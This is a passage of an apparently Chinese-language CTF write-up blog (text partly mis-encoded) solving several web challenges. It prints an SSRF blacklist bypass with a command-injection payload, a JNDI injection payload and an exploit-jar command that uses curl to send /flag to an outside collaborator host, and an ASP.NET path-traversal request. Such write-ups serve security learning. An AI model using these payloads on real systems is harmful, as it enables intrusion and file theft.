&lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">`echo &amp;#39;&lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">parse&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">u&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">href&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;gt;&amp;gt;/tmp/log`&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">child_process&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">exec&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">// å‘½ä»¤æ‰§è¡Œ
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">json&lt;/span>&lt;span style="color:#111">({&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#f92672">:&lt;/span>&lt;span style="color:#75af00">fs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">readFileSync&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/tmp/log&amp;#39;&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#111">()});&lt;/span>
&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">json&lt;/span>&lt;span style="color:#111">({});&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#75af00">router&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">post&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/debug&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">next&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">url&lt;/span> &lt;span style="color:#f92672">!==&lt;/span> &lt;span style="color:#00a8c8">undefined&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">u&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// POST urlå‚æ•°
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">urlObject&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">parse&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">u&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">// å¯¹urlè¿›è¡Œparse
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">blacklist&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">indexOf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">urlObject&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">hostname&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">){&lt;/span> &lt;span style="color:#75715e">// hostnameä¸åœ¨é»‘åå•ä¸­
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">dest&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">urlObject&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">href&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#75af00">request&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">dest&lt;/span>&lt;span style="color:#111">,(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#75af00">body&lt;/span>&lt;span style="color:#111">)=&amp;gt;{&lt;/span> &lt;span style="color:#75715e">// è®¿é—® ç›®æ ‡
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">json&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">body&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">json&lt;/span>&lt;span style="color:#111">([]);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#75af00">module&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">exports&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">router&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>éœ€è¦æž„é€ ä¸€ä¸ªssrfçš„urlï¼Œpostæ–¹å¼ä¼ å…¥å¹¶ä¸”ç»•è¿‡ssrfçš„é»‘åå•ï¼Œæ¯”å¦‚&lt;/p>
&lt;pre tabindex="0">&lt;code>http://0177.0.0.01/ # å…«è¿›åˆ¶
http://2130706433/ # åè¿›åˆ¶
&lt;/code>&lt;/pre>&lt;p>åŽé¢æŽ¥ä¸Š&lt;code>/debug?url=xxxx&lt;/code>ï¼Œpostä¼ å…¥åŽè°ƒç”¨&lt;code>request&lt;/code>ä¼šåˆ°&lt;code>get /debug&lt;/code>è¿›è¡Œå¤„ç†ï¼Œå°±å¯ä»¥&lt;code>child_process_exec&lt;/code>æ‰§è¡Œå‘½ä»¤äº†&lt;/p>
&lt;p>æ‰§è¡Œå‘½ä»¤çš„è¯ï¼Œå› ä¸ºåŽé¢å®ƒä¼šè¯»å‡º&lt;code>/tmp/log&lt;/code>çš„æ–‡ä»¶ï¼Œæ‰€ä»¥æˆ‘ä»¬æŠŠflagå†™å…¥è¿™ä¸ªæ–‡ä»¶ä¸­ï¼Œç”¨&lt;code>cp /flag /tmp/log&lt;/code>&lt;/p>
&lt;p>æž„é€ payloadæ—¶åŽŸä»£ç æ˜¯è¿™æ ·çš„&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">`echo &amp;#39;&lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">parse&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">u&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">href&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;gt;&amp;gt;/tmp/log`&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>æ‰€ä»¥å…ˆè¦é—­åˆechoåŽé¢çš„å•å¼•å·ï¼Œå†è€ƒè™‘&lt;code>url.parse(u).href&lt;/code>çš„ç»“æžœï¼Œæœ€åŽç”¨&lt;code>#&lt;/code>æŠŠåŽé¢å¤šä½™çš„æ³¨é‡ŠæŽ‰ï¼›ç„¶è€Œæœ‰ä¸ªæ­£åˆ™åŒ¹é…è¦å…ˆè¿‡æ»¤ä¸€ä¸‹å•å¼•å·&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">u&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">query&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">/[\&amp;#34;\&amp;#39;]/ig&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>æ‰€ä»¥ç”¨äºŒæ¬¡urlç¼–ç ï¼š&lt;code>' -&amp;gt; %27 -&amp;gt; %2527&lt;/code>åŠ &lt;code>@&lt;/code>ï¼Œè®©&lt;code>url.parse().href&lt;/code>æ—¶è®©&lt;code>@&lt;/code>å‰çš„éƒ¨åˆ†è¢«decodeURIComponent&lt;/p>
&lt;p>payloadè¦å†ç¼–ä¸€æ¬¡ç &lt;/p>
&lt;pre tabindex="0">&lt;code>POST:
url=http://2130706433/debug?url=http://%252527@1;cp$IFS$9/flag$IFS$9/tmp/log;%25%23
&lt;/code>&lt;/pre>&lt;p>flag{876797a7-fe5f-4a11-aa1f-bd0fbcb1640e}&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[çº¢æ˜Žè°·CTF 2021]JavaWeb
&lt;/h4>
&lt;/summary>
&lt;p>ä¸Žå¼ºç½‘æ‹Ÿæ€çš„Jack-Shiroç­‰ç­‰é¢˜éƒ½æ˜¯ä¸€æ ·çš„è€ƒç‚¹ï¼Œé¦–å…ˆæ˜¯ä¸€ä¸ª/;/jsonç»•è¿‡é‰´æƒï¼Œä¹‹åŽæ˜¯jndiæ³¨å…¥ï¼Œç”¨é‚£ä¸ªjarä¸€æŠŠæ¢­&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-json" data-lang="json">&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;ch.qos.logback.core.db.JNDIConnectionSource&amp;#34;&lt;/span>&lt;span style="color:#111">,{&lt;/span>&lt;span style="color:#f92672">&amp;#34;jndiLocation&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>&lt;span style="color:#d88200">&amp;#34;rmi://101.35.114.107:1099/qhx0ip&amp;#34;&lt;/span>&lt;span style="color:#111">}]&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &lt;span style="color:#d88200">&amp;#34;curl http://mg6uynla2pxa8ilgp4cprm0suj09oy.burpcollaborator.net/ -F file=@/flag&amp;#34;&lt;/span> -A &lt;span style="color:#d88200">&amp;#34;101.35.114.107&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[b01lers2020]Scrambled
&lt;/h4>
&lt;/summary>
&lt;p>é¡µé¢ä¸Šåªæœ‰ä¸€ä¸ªæ²¹ç®¡è§†é¢‘ï¼Œæ²¡æœ‰ç‰¹æ®Šçš„è¡Œä¸º&lt;/p>
&lt;p>æŠ“åŒ…çœ‹åˆ°cookieï¼Œåœ¨æ¯ä¸€æ¬¡reloadï¼ˆåœ¨é¡µé¢åº•éƒ¨ï¼‰ä¹‹åŽéƒ½ä¼šæ›´æ–°&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220118163951941.png" alt="image-20220118163951941">&lt;/p>
&lt;p>ä¸¤ä¸ªå­—æ®µï¼Œfrequencyå’Œtransmissions&lt;/p>
&lt;p>æ²¡æ˜Žç™½å•¥æ„æ€ï¼Œçœ‹wpçŸ¥é“è¿™é‡Œæ˜¯ä»£è¡¨äº†æ¯ä¸€ä½flagçš„å€¼ï¼Œæ¯”å¦‚ä¸Šé¢å›¾ç‰‡é‡Œçš„&lt;/p>
&lt;pre tabindex="0">&lt;code>7-12 -&amp;gt; 12ä½æ˜¯`-` å‰ä¸€ä½æ˜¯`7`
0f15 -&amp;gt; 15ä½æ˜¯`f` å‰ä¸€ä½æ˜¯`0`
&lt;/code>&lt;/pre>&lt;p>æ•´ä¸ªpyè„šæœ¬è‡ªåŠ¨ï¼ˆå‚è€ƒ&lt;a href="https://blog.csdn.net/weixin_44037296/article/details/112549815">wp&lt;/a>&lt;/p>
&lt;pre tabindex="0">&lt;code>import requests
import re
url = 'http://a3197079-a7bd-4d2f-847b-bad3410130b7.node4.buuoj.cn:81/'
headers = {'Cookie': 'frequency=1; transmissions=kxkxkxkxsh7-12kxkxkxkxsh'}
flag = [0] * 50
while True:
r = requests.session()
cookie = r.get(url, headers=headers).headers['Set-Cookie'] # å¾—åˆ°ä¸‹ä¸€æ¬¡çš„cookie
try:
tmp = re.search(r'kxkxkxkxsh(.+)kxkxkxkxsh;', cookie).group()[10:-11] # åŒ¹é…ä¸­é—´æœ‰ç”¨çš„éƒ¨åˆ†
flag[int(tmp[2:])] = tmp[1:2]
flag[int(tmp[2:]) - 1] = tmp[0:1]
for i in flag:
print(i, end='')
print()
except:
pass
&lt;/code>&lt;/pre>&lt;p>flag{3e6d8ee7-40f1-40a1-b496-93c40f43c8b8}&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[æžå®¢å¤§æŒ‘æˆ˜ 2020]Roamphp4-Rceme
&lt;/h4>
&lt;/summary>
&lt;p>ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œçš„é¡µé¢ï¼Œéœ€è¦éªŒè¯ç ï¼Œä¸è¿‡è¿™ä¸ªéªŒè¯ç æ˜¯å¸¸è§è€ƒç‚¹äº†&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">hashlib&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">func&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">md5_val&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">x&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">999999&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">100000000&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">md5_value&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">hashlib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">md5&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">encoding&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;utf-8&amp;#39;&lt;/span>&lt;span style="color:#111">))&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">hexdigest&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">md5_value&lt;/span>&lt;span style="color:#111">[:&lt;/span>&lt;span style="color:#ae81ff">5&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#111">md5_val&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">func&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;6e3f2&amp;#39;&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>å‘½ä»¤æ‰§è¡Œçš„éƒ¨åˆ†ï¼Œç›´æŽ¥çœ‹å‡ºé¢˜äººçš„wpå§ï¼Œç”¨çš„æ˜¯&lt;code>[~(å¼‚æˆ–)][!%FF]&lt;/code>çš„å½¢å¼ç»„æˆå­—ç¬¦ä¸²,ç„¶åŽæ— å‚æ•°RCE&lt;/p>
&lt;p>è¿™éƒ¨åˆ†ç”¨çš„æ˜¯å¼‚æˆ–æž„é€ çš„æ–¹å¼ï¼Œemmmï¼Œä¸Šå‘¨è¯´è¦æ€»ç»“çš„ï¼Œä½†æ˜¯æ²¡æ€»ç»“ï¼ˆæˆ‘çš„ï¼Œè¿™å‘¨ä¸€å®šçœ‹&lt;/p>
&lt;p>å‚è€ƒï¼š&lt;a href="https://mp.weixin.qq.com/s?__biz=MzIzOTg0NjYzNg==&amp;amp;mid=2247485218&amp;amp;idx=1&amp;amp;sn=e910ddbd965ecb069b4da3d06443f337&amp;amp;chksm=e92292a1de551bb7c48bcca06053faed2a212642ee6a2f7767f671cc553f6a2d435f99fbfae6&amp;amp;mpshare=1&amp;amp;scene=23&amp;amp;srcid=1202ez9PcajE5NTRrZG6OF9G&amp;amp;sharer_sharetime=1606872114678&amp;amp;sharer_shareid=8752e0fdce9cf3d7a08d6c6826060293#rd">å®˜æ–¹wp&lt;/a> | &lt;a href="https://blog.codesec.work/d6b7888bcefc/">wp1&lt;/a>&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[Windows][HITCON 2019]Buggy_Net
&lt;/h4>
&lt;/summary>
&lt;p>/Default.txtç»™å‡ºäº†æºç ï¼Œæ˜¯å°‘è§çš„win+asp.net&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-asp" data-lang="asp">bool isBad = false;
try {
if ( Request.Form[&amp;quot;filename&amp;quot;] != null ) { // filenameå‚æ•°éžç©º
isBad = Request.Form[&amp;quot;filename&amp;quot;].Contains(&amp;quot;..&amp;quot;) == true; // å¦‚æžœfilenameä¸­å«æœ‰`..`ä¸ºtrue
}
} catch (Exception ex) {
}
try {
if (!isBad) { // isBadä¸ºfalse
Response.Write(System.IO.File.ReadAllText(@&amp;quot;C:\inetpub\wwwroot\&amp;quot; + Request.Form[&amp;quot;filename&amp;quot;])); // è¯»å‡ºfilenameæŒ‡å®šçš„æ–‡ä»¶
}
} catch (Exception ex) {
}
&lt;/code>&lt;/pre>&lt;p>ä½†æ˜¯å½“å‰ç›®å½•åœ¨&lt;code>C:\inetpub\wwwroot\&lt;/code>ï¼Œéœ€è¦&lt;code>..\&lt;/code>è¿›è¡Œç›®å½•ç©¿è¶Šï¼›è¿™é‡Œçš„åˆ©ç”¨æ–¹å¼å‚è€ƒ-&amp;gt;&lt;a href="https://www.slideshare.net/SoroushDalili/waf-bypass-techniques-using-http-standard-and-web-servers-behaviour">WAF Bypass Techniques - Using HTTP Standard and Web Serversâ€™ Behaviour&lt;/a> | &lt;a href="https://ctftime.org/writeup/16802">wp&lt;/a>ï¼Œè¿™é‡Œè½¬è¿°ä¸€ä¸‹&lt;/p>
&lt;p>å¯¹äºŽPOSTè¯·æ±‚ï¼Œä¼šå­˜åœ¨request validationæ¥æ£€æµ‹formè¡¨å•ä¸­å«æœ‰ä¸€äº›å±é™©å†…å®¹ï¼ˆæ¯”å¦‚&lt;code>&amp;lt;x&lt;/code>ï¼‰ï¼Œå¤„ç†çš„æ–¹å¼æ˜¯ä¸­æ­¢æ•´ä¸ªappï¼›ç„¶è€Œå¯¹äºŽç›¸åŒçš„å†…å®¹ï¼Œåœ¨query-string fieldsä¸­ä¼šé€šè¿‡åˆå§‹çš„request validationï¼Œå¹¶ä¸”ä»…ä»…åœ¨é¦–æ¬¡çš„&lt;code>Request.QueryString[...]&lt;/code>æŠ›å‡ºå¼‚å¸¸&lt;/p>
&lt;p>å¯¹äºŽGETçš„query-string filedsä¹Ÿå­˜åœ¨request validationï¼Œä½†æ˜¯å¦‚æžœåŠ ä¸€ä¸ªformè¡¨å•ï¼Œå°±ä¼šäº§ç”Ÿå’Œä¸Šè¿°åŽåŠéƒ¨åˆ†ä¸€æ ·çš„æ•ˆæžœ&lt;/p>
&lt;p>æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬å¯ä»¥æäº¤ä¸€ä¸ªGETè¯·æ±‚ï¼ˆä¸å¸¦æœ‰getæŸ¥è¯¢å‚æ•°ï¼‰ï¼Œä½†æ˜¯ä¾ç„¶å«æœ‰bodyéƒ¨åˆ† å¹¶ä¸”æŠŠ&lt;code>&amp;lt;x&lt;/code>åŠ åˆ°bodyä¸­ï¼Œå°±ä¼šä½¿ç¬¬ä¸€æ¬¡çš„åˆ¤æ–­ä¸­è¿›å…¥å¼‚å¸¸éƒ¨åˆ†-&amp;gt;passï¼Œä¸ä¿®æ”¹&lt;code>isBad&lt;/code>çš„boolå€¼ï¼Œè¿›å…¥ç¬¬äºŒæ¬¡åˆ¤æ–­åŽç›´æŽ¥æ‹¼æŽ¥filenameï¼Œè¯»å‡ºflagï¼›payload&lt;/p>
&lt;pre tabindex="0">&lt;code>GET /
POST: filename=../../../flag.txt&amp;amp;amiz=&amp;lt;x
&lt;/code>&lt;/pre>&lt;p>å‚è€ƒï¼š&lt;a href="https://www.slideshare.net/SoroushDalili/waf-bypass-techniques-using-http-standard-and-web-servers-behaviour">WAF Bypass Techniques - Using HTTP Standard and Web Serversâ€™ Behaviour&lt;/a> | &lt;a href="https://ctftime.org/writeup/16802">wp&lt;/a>&lt;/p>
&lt;p>flag{e2c62455-e081-4782-8320-7c76ef570244}&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
*[NCTF2019]phar matches everything
&lt;/h4>
&lt;/summary>
&lt;p>ç»™å‡ºäº†æºç ï¼Œç›´æŽ¥github.devçœ‹äº† &lt;a href="https://github.dev/swfangzhang/My-2019NCTF/tree/master/phar%20matches%20everything">è¿™é‡Œæ˜¯url&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220119005449330.png" alt="image-20220119005449330">&lt;/p>
&lt;p>ä¸¤ä¸ªæ–‡ä»¶å¤¹åˆ†åˆ«æ˜¯ä¸¤ä¸ªdockerï¼ˆç”¨dockerfileç¼–æŽ’åˆ°ä¸€èµ·äº† ipä¸åŒï¼‰&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220119005701913.png" alt="image-20220119005701913">&lt;/p>
&lt;p>osrcçš„æœ‰80ç«¯å£æš´éœ²åœ¨å¤–é¢ï¼Œç»“åˆé¡µé¢çš„äº¤äº’å…ˆçœ‹osrcä¸­çš„catchmine.phpå’Œupload.php&lt;/p>
&lt;p>upload.phpï¼Œå¯ä»¥ä¸Šä¼ æ–‡ä»¶&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#111">$target_dir&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;uploads/&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$uploadOk&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$imageFileType&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">substr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_FILES&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;fileToUpload&amp;#34;&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#d88200">&amp;#34;name&amp;#34;&lt;/span>&lt;span style="color:#111">],&lt;/span>&lt;span style="color:#75af00">strrpos&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_FILES&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;fileToUpload&amp;#34;&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#d88200">&amp;#34;name&amp;#34;&lt;/span>&lt;span style="color:#111">],&lt;/span>&lt;span style="color:#d88200">&amp;#39;.&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#75af00">strlen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_FILES&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;fileToUpload&amp;#34;&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#d88200">&amp;#34;name&amp;#34;&lt;/span>&lt;span style="color:#111">]));&lt;/span>
&lt;span style="color:#111">$file_name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">md5&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">time&lt;/span>&lt;span style="color:#111">());&lt;/span>
&lt;span style="color:#111">$file_name&lt;/span> &lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">substr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$file_name&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">10&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#34;.&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$imageFileType&lt;/span>&lt;span style="color:#111">;&lt;/span>
